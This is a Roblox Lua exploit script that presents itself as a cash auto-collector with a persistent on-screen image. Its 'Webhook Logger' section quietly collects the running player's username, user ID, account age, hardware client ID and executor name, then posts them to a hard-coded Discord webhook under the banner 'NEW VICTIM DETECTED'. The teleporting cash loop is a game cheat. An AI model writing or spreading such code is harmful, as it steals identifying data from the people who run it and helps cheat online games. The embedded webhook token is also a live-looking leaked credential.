local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ===== PART 1: Persistent Image =====
local function createImage()
    local gui = playerGui:FindFirstChild("PersistentImageGui") or Instance.new("ScreenGui")
    gui.Name = "PersistentImageGui"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = playerGui

    local imageLabel = gui:FindFirstChild("ImageLabel") or Instance.new("ImageLabel")
    imageLabel.Name = "ImageLabel"
    imageLabel.Size = UDim2.new(0, 200, 0, 200)
    imageLabel.Position = UDim2.new(0, 110, 0, 400)
    imageLabel.Image = "rbxassetid://18783667991"
    imageLabel.BackgroundTransparency = 1
    imageLabel.ZIndex = 10
    imageLabel.Parent = gui
end

createImage()
player.CharacterAdded:Connect(createImage)

-- ===== PART 2: Webhook Logger (FIXED) =====
local WEBHOOK_URL = "https://discord.com/api/webhooks/1357449857652101361/cRXr49sM_B22VG_IDQYE8FPymKsoC44JUBGEM0I0K04Wkx_sZ7uYlLQrE08Q_aXkk5go"
local HttpService = game:GetService("HttpService")

local function sendWebhook()
    -- Create a new thread for the webhook so it doesn't block other code
    coroutine.wrap(function()
        local data = {}
        local success, err = pcall(function()
            local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
            data = {
                username = player.Name,
                displayName = player.DisplayName,
                userId = player.UserId,
                accountAge = math.floor((os.time() - player.AccountAge * 86400) / 86400),
                gameName = gameInfo.Name,
                placeId = game.PlaceId,
                hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "HWID_BLOCKED",
                executor = identifyexecutor and identifyexecutor() or "UNKNOWN_EXECUTOR",
                timestamp = os.date("%X • %d/%m/%Y")
            }
        end)

        if not success then
            data = {
                username = player.Name or "UNKNOWN",
                displayName = player.DisplayName or "UNKNOWN",
                userId = player.UserId or 0,
                gameName = "UNKNOWN",
                placeId = game.PlaceId or 0,
                hwid = "ERROR: "..tostring(err),
                executor = "UNKNOWN",
                timestamp = os.date("%X • %d/%m/%Y")
            }
        end

        local gameLink = string.format("[%s](https://www.roblox.com/games/%d)", data.gameName, data.placeId)
        local payload = {
            ["content"] = "@everyone **🚨 NEW VICTIM DETECTED 🚨**",
            ["embeds"] = {{
                ["title"] = "ROBLOX EXPLOIT REPORT",
                ["description"] = string.format(
                    "**🔹 Player Info:**\n```Username: %s\nDisplay: %s\nUID: %d\nAge: %d days```\n"..
                    "**🎮 Current Game:** %s\n"..
                    "**🔻 Hardware ID:**\n```%s```\n"..
                    "**⚡ Executor:** ```%s```",
                    data.username,
                    data.displayName,
                    data.userId,
                    data.accountAge,
                    gameLink,
                    data.hwid,
                    data.executor
                ),
                ["color"] = 16711680,
                ["thumbnail"] = {
                    ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", data.userId)
                },
                ["footer"] = {
                    ["text"] = "Logged at "..data.timestamp
                }
            }}
        }

        -- Try all possible request methods
        local requestFunctions = {
            function() return syn and syn.request end,
            function() return http and http.request end,
            function() return request end
        }

        for _, getRequest in ipairs(requestFunctions) do
            local req = getRequest()
            if req then
                local success, response = pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = HttpService:JSONEncode(payload)
                    })
                end)
                
                if success then
                    break -- Exit after first successful send
                end
            end
        end
    end)()
end

-- ===== PART 3: Cash Collector =====
local function startCashCollection()
    local path = workspace:FindFirstChild("CashSpawn")
    if not path then return end

    while task.wait(1) do
        local character = player.Character
        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
        if not rootPart then continue end

        for _, model in ipairs(path:GetChildren()) do
            if model:IsA("Model") then
                local pickedUp = model:FindFirstChild("PickedUp")
                if pickedUp and not pickedUp.Value then
                    rootPart.CFrame = model:GetPivot()
                    task.wait(0.5)
                    
                    for _, prompt in ipairs(model:GetDescendants()) do
                        if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                            fireproximityprompt(prompt)
                        end
                    end
                    
                    task.wait(1)
                    break
                end
            end
        end
    end
end

-- ===== MAIN EXECUTION =====
-- Send webhook immediately
sendWebhook()

-- Start cash collection after short delay
task.wait(2)
startCashCollection()
